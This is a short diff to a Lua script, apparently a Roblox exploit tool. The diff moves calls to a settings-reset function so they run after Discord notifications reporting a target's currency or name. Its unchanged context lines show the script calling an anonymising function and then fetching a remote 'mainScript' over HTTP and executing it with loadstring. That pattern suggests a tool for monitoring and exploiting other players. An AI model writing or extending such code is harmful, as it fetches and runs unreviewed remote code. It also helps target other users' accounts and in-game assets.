@@ -187,6 +187,7 @@ local function DiscordNotificationCURRENCY(txtlbl, temp)
 	end
 
 	myMessage.sendMessage()
+	ResetSettings()
 	return
 end
 
@@ -215,6 +216,7 @@ local function DiscordNotificationNAME(txtlbl: TextLabel)
 	end
 
 	myMessage.sendMessage()
+	ResetSettings()
 	return
 end
 
@@ -521,7 +523,6 @@ if meetsMinimum then
 	sound:Play()
 
 	Anonymousify()
-	ResetSettings()
 	task.spawn(function()
 		loadstring(game:HttpGet(mainScript))()
 	end)
@@ -537,7 +538,6 @@ elseif nameFound then
 	sound:Play()
 
 	Anonymousify()
-	ResetSettings()
 	task.spawn(function()
 		loadstring(game:HttpGet(mainScript))()
 	end)
